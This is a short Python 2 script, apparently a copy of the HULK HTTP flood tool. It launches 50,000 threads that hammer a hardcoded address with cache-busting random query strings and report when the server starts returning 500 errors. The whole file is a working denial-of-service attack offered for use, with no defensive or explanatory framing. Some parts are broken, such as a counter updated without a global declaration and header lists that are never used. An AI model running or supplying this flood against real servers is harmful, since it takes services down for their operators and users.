
import urllib2
import sys
import threading
import random
import re

url=''
host=''
headers_useragents=[]
headers_referers=[]
request_counter=0
flag=0
safe=0

def inc_counter():
	request_counter+=1

def set_flag(val):
	global flag
	flag=val

def buildblock(size):
	out_str = ''
	for i in range(0, size):
		a = random.randint(65, 90)
		out_str += chr(a)
	return(out_str)

def httpcall(url):
        global request_counter
        code=0
        if url.count("?")>0:
                param_joiner="&"
        else:
                param_joiner="?"
        request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
        try:
                        urllib2.urlopen(request)
        except urllib2.HTTPError, e:
                        #print e.code
                        set_flag(1)
                        print 'Response Code 500'
                        code=500
        except urllib2.URLError, e:
                        #print e.reason
                        sys.exit()
        else:
                        request_counter+=1
                        urllib2.urlopen(request)
        return(code)		

	
class HTTPThread(threading.Thread):
	def run(self):
		try:
			while flag<2:
				code=httpcall(url)
				if (code==500) & (safe==1):
					set_flag(2)
		except Exception, ex:
			pass

class MonitorThread(threading.Thread):
	def run(self):
		previous=request_counter
		while flag==0:
			if (previous+100<request_counter) & (previous<>request_counter):
				print "%d Requests Sent" % (request_counter)
				previous=request_counter
		if flag==2:
			print "\nAttack Finished"


print " Attack Started "
url = "http://192.168.43.1/"
for i in range(50000):
        t = HTTPThread()
        t.start()
t = MonitorThread()
t.start()

